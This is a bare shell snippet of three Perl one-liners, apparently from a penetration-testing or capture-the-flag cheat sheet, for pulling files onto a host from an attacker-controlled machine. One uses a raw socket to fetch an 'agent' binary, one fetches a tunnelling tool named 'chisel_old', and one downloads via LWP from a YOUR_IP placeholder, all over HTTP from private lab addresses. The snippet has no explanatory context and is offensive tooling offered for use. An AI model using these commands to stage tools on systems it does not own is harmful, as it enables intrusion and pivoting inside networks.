```sh
perl -e 'use IO::Socket::INET;
$h="10.10.16.42"; $p=80; $f="/agent";
$s=IO::Socket::INET->new(PeerAddr=>$h,PeerPort=>$p,Proto=>"tcp") or die $!;
print $s "GET $f HTTP/1.0\r\nHost: $h\r\n\r\n";
while(<$s>){ last if /^\r$/ }  # skip headers
open O,">agent"; while(read($s,$b,1024)){ print O $b }'

perl -e 'use File::Fetch; my $ff = File::Fetch->new(uri => "http://10.10.16.11:8000/chisel_old"); my $where = $ff->fetch();'
perl -e "use LWP::Simple; getstore('http://YOUR_IP:8000/file.txt', 'file.txt');"
```